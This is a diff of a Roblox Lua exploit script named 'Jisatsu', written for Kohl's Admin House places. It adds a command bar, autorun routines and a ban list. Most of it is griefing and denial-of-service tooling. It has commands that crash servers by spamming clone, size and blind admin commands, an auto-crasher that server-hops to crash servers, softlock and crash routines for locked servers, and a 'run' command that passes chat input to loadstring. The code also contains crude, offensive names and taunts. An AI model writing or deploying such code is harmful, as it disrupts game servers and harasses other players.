@@ -1,8 +1,16 @@
+--[[
+
+112420803 is KOHLS ADMIN HOUSE NBC BY AGSPUREIAM
+115670532 is KOHLS ADMIN HOUSE BC BY AGSPUREIAM
+14747334292 is KOHLS ADMIN HOUSE NP BY TECH
+
+]]
+
 repeat
     wait()
 until game:IsLoaded()
 
-if game.PlaceId ~= 112420803 and game.PlaceId ~= 115670532 then
+if game.PlaceId ~= 112420803 and game.PlaceId ~= 115670532 and game.PlaceId ~= 14747334292 then
     return
 end
 
@@ -15,7 +23,6 @@ local Settings = {
     ["Script Name"] = "Jisatsu", -- The name of the script (can be changed)
     ["prefix"] = "<", -- Prefix used for running commands (e.g., "<command")
     ["Welcome Message"] = "Successfully Loaded.", -- Message shown when the script is successfully loaded
-
     ["Person299's Admin"] = true, -- Whether Person299 is bought or not, Some commands are specific.
     ["alowads"] = true, -- Whether to allow ads to run (likely related to user or script interaction)
     ["antilogs"] = true, -- Enables protection to prevent the use of logging commands
@@ -28,17 +35,16 @@ local Settings = {
     ["Default Whitelisted"] = {}, -- List of people whitelisted by default (can bypass bans or restrictions)
     ["Default Banned"] = {"Instlgator","blue20043","Arman2oooo","aonhayhoinon011","KsiPrimeUwu","BarfinOnTheHomeless","immutate","Famouson4chan","ospedaIe","an1emono"}, -- List of people banned by default (cannot access script or server)
     ["hatbanned"] = {5738244883}, -- List of hat IDs that are banned from being worn
-    ["Autorun Commands"] = {"nok", "antikick", "anticolkick"}, -- Commands to run automatically when the script is loaded
+    ["Autorun Commands"] = {"nok", "antikick", "anticolkick", "antikick"}, -- Commands to run automatically when the script is loaded
     ["Legacy Serverlock"] = true, -- Softlocks players instead of crashing
     ["Punish Based Softlock"] = true, -- Uses punishing for softlocking instead of sizing and sending to heaven info
-
     ["Auto Crasher"] = { -- Automatically serverhop and crash servers
         ["Enabled"] = false,
         ["Message"] = "Running autocrasher", -- Message to send upon before crashing, set to nil if no message
         ["Serverhop Time"] = 10, -- Serverhops after specified amount of time
         ["Skip Crashed Servers"] = false, -- Uses savehop instead of serverhop
         ["Timeout"] = 10, -- Gives up on joining a server after a specified amount of time
-        ["Commands"] = {"music 17422147220"}, -- Commands to run on join
+        ["Commands"] = {}, -- Commands to run on join
         ["Command Delay"] = -1, -- Delay between commands, -1 is none
         ["Ignore Autorun Commands"] = true, -- Skips the autorun commands
         ["Time Before Crash"] = .5, -- Time before crashing server, -1 is instant
@@ -52,14 +58,14 @@ local Settings = {
             ["Players"] = {} -- Players that get targetted
         }
     },
-    ["Player Autorun Commands"] = { -- Automatically runs commands when these players are detected
+    ["Autorun Commands"] = {-- Automatically runs commands when these players are detected
         ["itspavvv"] = "characteradded itspavvv runcommand hat itspavvv 17401056338",
         ["iiuxurryy"] = "characteradded iiuxurryy runcommand hat iiuxurryy 17401056338"
     }
 }
 
 local ScriptName = Settings["Script Name"]
-local prefix = Settings["Prefix"]
+local prefix = Settings["prefix"]
 local Whitelisted = Settings["Default Whitelisted"]
 local Banned = Settings["Default Banned"]
 local autoruncmds = Settings["Autorun Commands"]
@@ -84,84 +90,278 @@ local HttpService = game:GetService("HttpService")
 local loadtime = os.clock()
 local Stable_Check = true
 local nadoublechatkys, blehhhhhhhhh, pdiddyrapedme = false, false, false
+local consoleOn = true
 local backpackcon, workspacecon = nil, nil
 local owner = game.Players.LocalPlayer
 local player = owner
 local localplayer = owner
 local lp = owner
 local plr = owner
-local chr, character, char = owner.Character
-local ors, afkstatus, chatlogs, updatedPlayerList = nil, true, true, true
-local consoleOn = true
+local chr, character, char = owner.Character or {}
+local ors, afkstatus, chatlogs, updatedPlayerList = nil, true, false, true
 game:GetService("RunService").RenderStepped:Connect(
     function()
         chr = owner.Character
     end
 )
 
-local function PlayerAdded(Player)
-    spawn(function()
-        repeat wait() until Player and Player.Name
-        if table.find(Whitelisted,Player.Name) then
+--[[ Start Anti Punish ]]--
+
+--[[ End Anti Punish ]]--
+
+--[[ Start Command Bar ]]-- Thanks Knocks
+task.delay(0.5, function()
+    local ScreenGui = Instance.new("ScreenGui")
+	local Frame = Instance.new("Frame")
+	local Frame_2 = Instance.new("Frame")
+	local TextBox = Instance.new("TextBox")
+	local UIStroke = Instance.new("UIStroke")
+	local enabled;
+
+	ScreenGui.Parent = game.CoreGui
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	ScreenGui.DisplayOrder = 9999
+	ScreenGui.IgnoreGuiInset = true
+	ScreenGui.ResetOnSpawn = false
+
+	Frame.Parent = ScreenGui
+	Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Frame.BackgroundTransparency = 1.000
+	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Frame.BorderSizePixel = 0
+	Frame.Transparency = 1
+	Frame.Size = UDim2.new(1, 0, 1, 0)
+
+	Frame_2.Parent = Frame
+	Frame_2.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+	Frame_2.BackgroundTransparency = 0.200
+	Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Frame_2.BorderSizePixel = 0
+	Frame_2.Position = UDim2.new(-0.0132391872, 0, 0, 0)
+	Frame_2.Transparency = 0.2
+	Frame_2.Size = UDim2.new(1.0260371, 0, 0.0892857164, 0)
+
+	UIStroke.Parent = Frame_2
+	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	UIStroke.LineJoinMode = Enum.LineJoinMode.Round
+	UIStroke.Thickness = 2.5
+	UIStroke.Color = Color3.fromRGB(2, 48, 255)
+
+	TextBox.Parent = Frame_2
+	TextBox.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+	TextBox.BackgroundTransparency = 1.000
+	TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	TextBox.BorderSizePixel = 0
+	TextBox.Position = UDim2.new(0.0228084419, 0, 0.119999997, 0)
+	TextBox.Size = UDim2.new(0.954382956, 0, 0.75999999, 0)
+	TextBox.Transparency = 1
+	TextBox.TextTransparency = 0
+	TextBox.Font = Enum.Font.SourceSans
+	TextBox.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
+	TextBox.PlaceholderText = "Type Here"
+	TextBox.Text = ""
+	TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextBox.TextSize = 20.000
+	TextBox.TextXAlignment = Enum.TextXAlignment.Left
+	task.wait(0.5)
+	Frame_2:TweenPosition(UDim2.new(-0.0132391872, 0, -1, 0), "Out", "Quad", 0.3)
+	enabled = false
+	TextBox.Focused:Connect(function()
+		TextBox.Text = ""
+		enabled = true
+		Frame_2.Position = UDim2.new(-0.0132391872, 0, 0, 0)
+	end)
+	TextBox.FocusLost:Connect(function()
+		if TextBox.Text ~= "" then
+			game.Players:Chat("<"..TextBox.Text)
+			TextBox.Text = ""
+		end
+		enabled = false
+		Frame_2.Position = UDim2.new(-0.0132391872, 0, -1, 0)
+	end)
+	game:GetService("UserInputService").InputEnded:Connect(function(key, gameProcessedEvent)
+		if key.KeyCode == Enum.KeyCode.Semicolon and not gameProcessedEvent then
+			if not enabled then
+				TextBox:CaptureFocus()
+			end
+		end
+	end)
+end)
+--[[ End Command Bar ]]--
+
+spawn(function()
+    if not (Settings["Auto Crasher"]["Enabled"] and Settings["Auto Crasher"]["Ignore Autorun Commands"]) then
+    for i,v in pairs(Settings["Autorun Commands"]) do
+        if not running then return end
+        local BM = v:split(" ")
+        local commandname = prefix..BM[1]:lower()
+        local t = ""
+        table.remove(BM,1)
+        local findargs = {}
+        for i,v2 in pairs(BM) do
+            table.insert(findargs,v2)
+            t=t..v2.." "
         end
-	
-	if table.find(PlayerCrash,Player.Name) and not Settings["Auto Crasher"]["Enabled"] then -- Automatically crashes if in server
-		GUI:SendMessageNoBrackets("\n\n\n\n["..ScriptName.."]", "\n\n\n\nAuto crash player ("..Player.DisplayName..") found, crashing server.")
-		task.wait(0.333)
-		if PlayerCrashMode == true then
-			runCommand(prefix.."vampirecrash",{})
-		else
-			runCommand(prefix.."shutdown",{})
-		end
-	end
-	
-	if Settings["Player Autorun Commands"][Player.Name] and not (Settings["Auto Crasher"]["Enabled"] and Settings["Auto Crasher"]["Ignore Autorun Commands"]) then
-		local v = Settings["Player Autorun Commands"][Player.Name]
-		local fixer = {}
-		if #v > 1 then
-			for i=2,#v:split(" ") do
-				table.insert(fixer,v:split(" ")[i])
-			end
-		end
-		
-		print("player "..Player.Name.." is in server, autorunning command: "..prefix..v)
-		runCommand(prefix..v:split(" ")[1],fixer)
-	end
-        
-        if ServerLocked and not table.find(Whitelisted,Player.Name) and not table.find(ServerLockedProtection,Player.Name) then
-                if ServerLockedSoundEnabled then
-                    spawn(function()
-                        logn(ScriptName, "This server is currently locked.")
-                    end)
-                    wait(0.1)
-                    repeat wait() until Player and Player.Character
-                    wait(0.25)
-			if OldServerLock then
-				spawn(function()
-					game.Players:Chat("music "..tostring(ServerLockedSound))
-					wait(10)
-					game.Players:Chat("music nan")
-				end)
-				runCommand(prefix.."softlock",{Player.Name})
-			else
-                    		runCommand(prefix.."rocketcrashsound",{Player.Name,ServerLockedSound})
-			end
+        spawn(function()runCommand(commandname,findargs)end)
+        if consoleOn then
+        print("autorunning command: "..commandname.." "..t)
+        end
+    end 
+    end end)
+
+local function PlayerAdded(Player)
+    spawn(
+        function()
+            repeat
+                wait()
+            until Player and Player.Name
+            if table.find(Whitelisted, Player.Name) then
+            end
+
+            if table.find(PlayerCrash, Player.Name) and not Settings["Auto Crasher"]["Enabled"] then -- Automatically crashes if in server
+                GUI:SendMessageNoBrackets(
+                    "\n\n\n\n[" .. ScriptName .. "]",
+                    "\n\n\n\nAuto crash player (" .. Player.DisplayName .. ") found, crashing server."
+                )
+                task.wait(0.333)
+                if PlayerCrashMode == true then
+                    runCommand(prefix .. "vgc", {})
                 else
-                    spawn(function()
-                        GUI:SendMessage(ScriptName, "This server is currently locked.")
-                    end)
-                    wait(0.1)
-                    repeat wait() until Player and Player.Character
-                    wait(0.25)
-			if OldServerLock then
-				runCommand(prefix.."softlock",{Player.Name})
-			else
-                    		runCommand(prefix.."rocketcrash",{Player.Name})
-			end
+                    runCommand(prefix .. "blacked", {})
                 end
             end
-    end)
+
+            if Settings["Player Autorun Commands"][Player.Name] then
+                local v = Settings["Player Autorun Commands"][Player.Name]
+                if v then
+                    local fixer = {}
+                    if #v > 1 then
+                        for i = 2, #v:split(" ") do
+                            table.insert(fixer, v:split(" ")[i])
+                        end
+                    end
+                    if prefix then
+                        print("player " .. Player.Name .. " is in server, autorunning command: " .. prefix .. v)
+                        runCommand(prefix .. v:split(" ")[1], fixer)
+                        end
+                    end
+                end
+
+            if ServerLocked and not table.find(Whitelisted, Player.Name) and ServerLockedProtection and not table.find(ServerLockedProtection, Player.Name) then
+                if ServerLockedSoundEnabled then
+                    spawn(
+                        function()
+                            logn(ScriptName, "This server is currently locked.")
+                        end
+                    )
+                    wait(0.1)
+                    repeat
+                        wait()
+                    until Player and Player.Character
+                    wait(0.25)
+                    if OldServerLock then
+                        spawn(
+                            function()
+                                game.Players:Chat("music " .. tostring(ServerLockedSound))
+                                wait(10)
+                                game.Players:Chat("music nan")
+                            end
+                        )
+                        runCommand(prefix .. "softlock", {Player.Name})
+                    else
+                        runCommand(prefix .. "rocketcrashsound", {Player.Name, ServerLockedSound})
+                    end
+                else
+                    spawn(
+                        function()
+                            GUI:SendMessage(ScriptName, "This server is currently locked.")
+                        end
+                    )
+                    wait(0.1)
+                    repeat
+                        wait()
+                    until Player and Player.Character
+                    wait(0.25)
+                    if OldServerLock then
+                        runCommand(prefix .. "softlock", {Player.Name})
+                    else
+                        runCommand(prefix .. "rocketcrash", {Player.Name})
+                    end
+                end
+            end
+        end
+    )
 end
+
+--friend notification
+
+local function onPlayerAdded(player)
+    local localPlayer = game.Players.LocalPlayer
+
+    if localPlayer:IsFriendsWith(player.UserId) then
+        local response = Instance.new("BindableFunction")
+        response.OnInvoke = function(answer)
+            if answer == "Bring" then
+                game.Players:Chat("tp " .. player.Name .. " me")
+            elseif answer == "To" then
+                game.Players:Chat("tp me " .. player.Name)
+            end
+        end
+
+        game:GetService("StarterGui"):SetCore(
+            "SendNotification",
+            {
+                Title = "Valhalla",
+                Text = "Your friend has joined the game. Choose an action:",
+                Duration = 5,
+                Callback = response,
+                Button1 = "Bring",
+                Button2 = "To"
+            }
+        )
+    end
+end
+
+game.Players.PlayerAdded:Connect(onPlayerAdded)
+
+--ban script
+local fileName = "Banned.txt"
+
+local function Remind(msg)
+    game.StarterGui:SetCore(
+        "SendNotification",
+        {
+            Title = "Valhalla.",
+            Text = msg,
+            Duration = 2
+        }
+    )
+end
+
+local function loadBannedPlayers()
+    if
+        pcall(
+            function()
+                readfile(fileName)
+            end
+        )
+     then
+        local content = readfile(fileName)
+        for line in content:gmatch("[^\r\n]+") do
+            table.insert(Banned, line)
+        end
+    end
+end
+
+local function saveBannedPlayers()
+    local content = ""
+    for _, name in ipairs(Banned) do
+        content = content .. name .. "\n"
+    end
+    writefile(fileName, content)
+end
+
+loadBannedPlayers()
 
 task.spawn(
     function()
@@ -258,6 +458,10 @@ task.spawn(
         end
     end
 )
+
+local function talk(msg)
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+end
 
 task.spawn(
     function()
@@ -398,46 +602,9 @@ end
 
 loadBannedPlayers()
 
-game.Players.LocalPlayer.Chatted:Connect(
-    function(msg)
-        if string.sub(msg, 1, 4) == "/hban2" then
-            local playerz = string.sub(msg, 6)
-            local Player = GetPlayers(playerz)
-            for i, v in pairs(Player) do
-                if not table.find(Banned, v.Name) then
-                    table.insert(Banned, v.Name)
-                    appendfile(fileName, v.Name .. "\n")
-                    chatshit("/hban " .. v.Name)
-                    Remind("Banned " .. v.Name)
-                else
-                    Remind("Player:" .. v.Name .. " is Banned already")
-                end
-            end
-        end
-    end
-)
-
-game.Players.LocalPlayer.Chatted:Connect(
-    function(msg)
-        if string.sub(msg, 1, 7) == "/unhban2" then
-            local playerz = string.sub(msg, 9)
-            local Player = GetPlayers(playerz)
-            for i, v in pairs(Player) do
-                if table.find(Banned, v.Name) then
-                    table.remove(Banned, v.Name)
-                    Remind("Unbanned " .. v.Name)
-                    saveBannedPlayers()
-                else
-                    Remind("Player:" .. v.Name .. " isnt Banned")
-                end
-            end
-        end
-    end
-)
-
 local function onPlayerAdded(player)
     if table.find(Banned, player.Name) then
-        chatshit("/hban " .. player.Name)
+        chatshit("hban " .. player.Name)
     end
 end
 
@@ -464,10 +631,6 @@ function checkGamepass(Target, ID)
         return "404"
     end
 end
-
--- command returner
-
--- end command return(er)
 
 Quotes = {
     "i completely cleared a khols admin server",
@@ -815,9 +978,14 @@ logn(
     5
 )
 logn("Script Owned & Developed By Reiko, Cxo, and Knocks", 3)
+wait(.5)
 chatshit(
-    "h 😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹\n\n\n\n\n\n\nlocal money = math.huge\n\n\n\n\n\n\n"
+    "h 😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹\n\n\n\n\n\n\nasus gaming pc with built in fan\n\n\n\n\n\n\n"
 )
+chatshit("<nok")
+chatshit("<antikick")
+chatshit("<anticolkick")
+chatshit("<fixfilter")
 
 task.delay(
     0.4,
@@ -1164,11 +1332,12 @@ game.Players.LocalPlayer.Chatted:Connect(
 )
 
 --[[ COMMANDS ]]
-connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
-    local splitted = msg:split(" ")
-    if splitted[1] and #splitted[1] > 0 then
+connections.commands =
+    game.Players.LocalPlayer.Chatted:Connect(
+    function(msg)
+        local splitted = msg:split(" ")
         table.insert(commandlist, splitted[1])
-        if splitted[1] == prefix .. "silcrash" then
+        if prefix and splitted[1] == prefix .. "silcrash" then
             for i = 1, 5 do
                 chatshit("size all .3")
             end
@@ -1183,25 +1352,25 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             for i = 1, 200 do
                 chatshit("clone all all all fuck")
             end
-        elseif splitted[1] == prefix .. "toggle" and splitted[2] == "mymusiconly" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "toggle" and splitted[2] == "mymusiconly" then
             mymusiconly = not mymusiconly
             logn("MyMusicOnly is now set to " .. tostring(mymusiconly))
             if mymusiconly then
                 chatshit("music " .. mymusiconly_ID)
             end
-        elseif splitted[1] == prefix .. "mmoid" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "mmoid" then
             if tonumber(splitted[3]) then
                 mymusiconly_ID = tonumber(splitted[3])
                 logn("mymusiconly_id is now set to " .. tostring(mymusiconly_ID))
                 mymusiconly = true
                 chatshit("music " .. mymusiconly_ID)
             end
-        elseif splitted[1] == prefix .. "prefix" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "prefix" then
             prefix = splitted[2]
-        elseif splitted[1] == prefix .. "run" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "run" then
             local execute = #splitted[1] + 1
             loadstring(string.sub(msg, execute))()
-        elseif splitted[1] == prefix .. "vgcrash" then -- credits to knocks for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "vgcrash" then -- credits to knocks for this
             chatshit("gear me 94794847")
             repeat
                 task.wait()
@@ -1219,13 +1388,13 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 chatshit("unsize me")
             end
             chatshit("<shop")
-        elseif splitted[1] == prefix .. "level" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "level" then
             local count = tonumber(splitted[2]) or 1
             for i = 1, count do
                 getgenv().printidentity = nil
                 printidentity()
             end
-        elseif splitted[1] == prefix .. "bl" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "bl" then
             local player = splitted[2]
             if player and not blacklistedPlayers[player] then
                 fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
@@ -1258,7 +1427,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
 
                 coroutine.resume(blacklistedPlayers[player].coroutine)
             end
-        elseif splitted[1] == prefix .. "unbl" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unbl" then
             local player = splitted[2]
             if player and blacklistedPlayers[player] then
                 coroutine.yield(blacklistedPlayers[player].coroutine)
@@ -1270,8 +1439,8 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 logn("Blacklist disabled for player: " .. player .. " You're welcome.")
             end
         elseif
-            splitted[1] == prefix .. "antilag" or splitted[1] == prefix .. "boostfps" or
-                splitted[1] == prefix .. "lowgraphics"
+            Settings.prefix and splitted[1] == Settings.prefix .. "antilag" or Settings.prefix and splitted[1] == Settings.prefix .. "boostfps" or
+                Settings.prefix and splitted[1] == Settings.prefix .. "lowgraphics"
          then
             local Terrain = workspace:FindFirstChildOfClass("Terrain")
             Terrain.WaterWaveSize = 0
@@ -1321,7 +1490,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     )
                 end
             )
-        elseif splitted[1] == prefix .. "swim" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "swim" then
             if not swimming and speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
                 oldgrav = workspace.Gravity
                 workspace.Gravity = 0
@@ -1353,9 +1522,9 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 )
                 swimming = true
             end
-        elseif splitted[1] == prefix .. "logny" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "logny" then
             logny(getstring(1))
-        elseif splitted[1] == prefix .. "esp" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "esp" then
             logn("This is IY's ESP")
             if not CHMSenabled then
                 ESPenabled = true
@@ -1367,7 +1536,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logny("ESP", "Disable chams (nochams) before using esp")
             end
-        elseif splitted[1] == prefix .. "hidebp" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "hidebp" then
             if workspace.Terrain._Game.Workspace:FindFirstChild("Baseplate") then
                 move(
                     workspace.Terrain._Game.Workspace:FindFirstChild("Baseplate"),
@@ -1389,7 +1558,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("Baseplate Not Loaded", 2)
             end
-        elseif splitted[1] == prefix .. "hidereg" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "hidereg" then
             if workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
                 move(
                     workspace.Terrain._Game.Admin:FindFirstChild("Regen"),
@@ -1411,7 +1580,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("Regen Not Loaded", 2)
             end
-        elseif splitted[1] == prefix .. "fixreg" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixreg" then
             if workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
                 move(
                     workspace.Terrain._Game.Admin:FindFirstChild("Regen"),
@@ -1420,9 +1589,9 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("Regen Not Loaded", 2)
             end
-        elseif splitted[1] == prefix .. "fixmover" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixmover" then
             fixmover()
-        elseif splitted[1] == prefix .. "noesp" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "noesp" then
             logn("This is IY's NoESP")
             ESPenabled = false
             for i, c in pairs(COREGUI:GetChildren()) do
@@ -1430,7 +1599,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     c:Destroy()
                 end
             end
-        elseif splitted[1] == prefix .. "esptransparency" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "esptransparency" then
             logn("This is IY's esptransparency")
             local transparencyArg = splitted[2]
             espTransparency = (transparencyArg and isNumber(transparencyArg) and transparencyArg) or 0.3
@@ -1456,7 +1625,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     partEspTrigger = nil
                 end
             end
-        elseif splitted[1] == prefix .. "partesp" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "partesp" then
             local partEspName = splitted[2]:lower()
             if not FindInTable(espParts, partEspName) then
                 table.insert(espParts, partEspName)
@@ -1477,7 +1646,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             if partEspTrigger == nil then
                 partEspTrigger = workspace.DescendantAdded:Connect(partAdded)
             end
-        elseif splitted[1] == prefix .. "unpartesp" or splitted[1] == prefix .. "nopartesp" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unpartesp" or Settings.prefix and splitted[1] == Settings.prefix .. "nopartesp" then
             local partEspName = splitted[2] and splitted[2]:lower() or nil
             if partEspName then
                 if FindInTable(espParts, partEspName) then
@@ -1498,7 +1667,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     end
                 end
             end
-        elseif splitted[1] == prefix .. "view" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "view" then
             StopFreecam()
             local players = getPlayer(splitted[2], speaker)
             for i, v in pairs(players) do
@@ -1521,10 +1690,10 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 end
                 viewChanged = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
             end
-        elseif splitted[1] == prefix .. "volume" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "volume" then
             local level = splitted[2] and splitted[2] / 10
             UserSettings():GetService("UserGameSettings").MasterVolume = level
-        elseif splitted[1] == prefix .. "savemap" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "savemap" then
             local mapname = string.sub(text, text:split(" ")[1]:len() + 2)
             if not isfile(mapname .. ".json") then
                 local table = {}
@@ -1542,7 +1711,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("File Already Exists With That Name", 3)
             end
-        elseif splitted[1] == prefix .. "loadmap" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "loadmap" then
             local mapname = string.sub(text, text:split(" ")[1]:len() + 2)
             if isfile(mapname .. ".json") then
                 local decoded = game:GetService("HttpService"):JSONDecode(readfile(mapname .. ".json"))
@@ -1581,7 +1750,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 end
                 return result
             end
-        elseif splitted[1] == prefix .. "savepaint" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "savepaint" then
             local paintname = string.sub(text, #split(text, " ")[1]:len() + 2)
             if not isfile(paintname .. ".json") then
                 local paintTable = {}
@@ -1598,7 +1767,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("File Already Exists With That Name", 3)
             end
-        elseif splitted[1] == prefix .. "loadpaint" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "loadpaint" then
             local paintname = string.sub(text, text:split(" ")[1]:len() + 2)
             if isfile(paintname .. ".json") then
                 local decoded = game:GetService("HttpService"):JSONDecode(readfile(paintname .. ".json"))
@@ -1624,7 +1793,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             else
                 logn("File Does Not Exist", 3)
             end
-        elseif splitted[1] == prefix .. "r.fps" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "r.fps" then
             if setfpscap and type(setfpscap) == "function" then
                 local num = splitted[2] or 1e6
                 if num == "none" then
@@ -1640,7 +1809,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     "Your exploit does not support this command (missing fpscap)\n\n\n"
                 )
             end
-        elseif splitted[1] == prefix .. "unswim" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unswim" then
             if speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
                 workspace.Gravity = oldgrav
                 swimming = false
@@ -1658,9 +1827,9 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     Humanoid:SetStateEnabled(v, true)
                 end
             end
-        elseif splitted[1] == prefix .. "gametp" or splitted[1] == prefix .. "gameteleport" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "gametp" or Settings.prefix and splitted[1] == Settings.prefix .. "gameteleport" then
             TeleportService:Teleport(splitted[2])
-        elseif splitted[1] == prefix .. "serverhop" or splitted[1] == prefix .. "shop" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "serverhop" or Settings.prefix and splitted[1] == Settings.prefix .. "shop" then
             if httprequest then
                 local servers = {}
                 local placeIds = {115670532, 112420803}
@@ -1705,7 +1874,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                     "h/ \n\n\nIncompatible Exploit: Your exploit does not support this command (missing request)\n\n\n"
                 )
             end
-        elseif splitted[1] == prefix .. "joinplayer" or splitted[1] == prefix .. "joinp" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "joinplayer" or Settings.prefix and splitted[1] == Settings.prefix .. "joinp" then
             local retries = 0
             local function ToServer(User, Place)
                 if splitted[3] == nil then
@@ -1772,7 +1941,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 end
             end
             ToServer(splitted[2], splitted[3])
-        elseif splitted[1] == prefix .. "ez" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "ez" then
             chatshit("music 0000000000000000000007266001792")
             chatshit("h n\n\n\n\n\n\n\n\n\nYoU ArE an\nI\nD\nI\nO")
             chatshit("h n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n T")
@@ -1798,7 +1967,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             for i = 1, 1000 do
                 chatshit("clone all all all")
             end
-        elseif splitted[1] == prefix .. "errorcrash" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "errorcrash" then
             chatshit("blind all all all all all all all all all")
             chatshit(
                 "music  0 0 0 00 0 0 0 0 0 00 0 0 0  0 00 0 0 000 0  00  00  00  00 00 00 0 0 00 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0315006886"
@@ -1847,7 +2016,7 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             for i = 1, 200 do
                 chatshit("clone all all all fuck")
             end
-        elseif splitted[1] == prefix .. "blacked" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "blacked" then
             chatshit("respawn all")
             chatshit("music 0000000000000000000007266001792")
             chatshit("name all      ")
@@ -1855,8 +2024,23 @@ connections.commands = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             chatshit("fogcolor 0 0 0")
             chatshit("fogend 0")
             wait(0.5)
-            runCommand(prefix .. "silcrash", {})
-        elseif splitted[1] == prefix .. "cat" then
+            chatshit("gear me 94794847")
+            repeat
+                task.wait()
+            until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
+            game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher").Parent =
+                game.Players.LocalPlayer.Character
+            repeat
+                task.wait()
+            until game.Players.LocalPlayer.Character:FindFirstChild("VampireVanquisher")
+            for i = 1, 3 do
+                chatshit("size all .3")
+            end
+            chatshit("clone all")
+            for i = 1, 50 do
+                chatshit("unsize me")
+            end
